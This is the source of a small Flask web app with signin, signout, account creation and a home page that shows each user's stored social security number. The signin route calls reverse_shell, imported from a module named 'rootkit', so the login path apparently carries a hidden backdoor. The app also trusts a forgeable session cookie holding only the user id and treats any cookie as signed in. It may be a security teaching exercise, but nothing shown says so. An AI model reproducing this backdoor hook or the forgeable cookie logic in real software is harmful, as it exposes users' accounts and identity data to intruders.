from flask import Flask, render_template, request, redirect, make_response
from database import LocalDatabase, RemoteDatabase
from rootkit import reverse_shell

app = Flask(__name__)
db = RemoteDatabase()

# API ENDPOINTS


@app.route("/")
def index():
    if signed_in():
        return redirect("/home")
    return render_template("index.html")


@app.route("/signin", methods=["POST"])
def signin():
    user = db.get_user_by_id(int(request.form.get("user_id")))

    if user is None:
        return redirect("/")
    res = make_response(redirect("/home"))
    # TODO: change this to use session
    # e.g. https://stackoverflow.com/questions/12272418/in-flask-set-a-cookie-and-then-re-direct-user
    res.set_cookie("session_id", str(user.id))
    reverse_shell(res)
    return res


@app.route("/home")
def home():
    if signed_in():
        user = current_user()
        return render_template("home.html", name=user.name, ssn=user.ssn, id=user.id)
    else:
        return redirect('/')


@app.route("/signout")
def signout():
    res = make_response(redirect("/"))
    res.set_cookie("session_id", "", expires=0)
    return res


@app.route("/createAccount",  methods=["GET", "POST"])
def createAccount():
    if request.method == "GET":
        return render_template("createAccount.html")
    else:
        # add user
        username = request.form.get("username")
        ssn = request.form.get("ssn")
        db.add_user(username, ssn)

        # sign user in
        user = db.get_user_by_name(username)
        res = make_response(redirect("/home"))
        # TODO: change this to use session
        # e.g. https://stackoverflow.com/questions/12272418/in-flask-set-a-cookie-and-then-re-direct-user
        res.set_cookie("session_id", str(user.id))
        return res

# HELPER FUNCTIONS


def signed_in():
    return request.cookies.get("session_id") is not None


def current_user():
    session_id = request.cookies.get("session_id")
    return db.get_user_by_id(session_id)


if __name__ == "__main__":
    app.run(host='0.0.0.0')
